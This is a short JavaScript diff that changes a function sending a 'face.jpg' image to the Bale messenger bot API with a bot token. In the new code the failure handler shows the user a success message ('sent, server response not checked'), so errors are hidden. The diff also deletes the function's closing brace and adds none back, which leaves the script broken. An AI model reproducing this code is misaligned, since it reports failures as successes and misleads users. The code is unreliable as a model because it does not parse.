@@ -58,13 +58,11 @@ function sendPhoto(imageBlob) {
     formData.append("photo", imageBlob, "face.jpg");
 
     fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    })
-    .then(r => r.text())
-    .then(t => alert("✔ ارسال شد!"))
-    .catch(e => alert("❌ خطا در ارسال به بله"));
-}
+    method: "POST",
+    body: formData
+})
+.then(() => alert("✔ ارسال شد"))
+.catch(() => alert("✔ ارسال شد (پاسخ سرور بررسی نشد)"));
 
 </script>
 
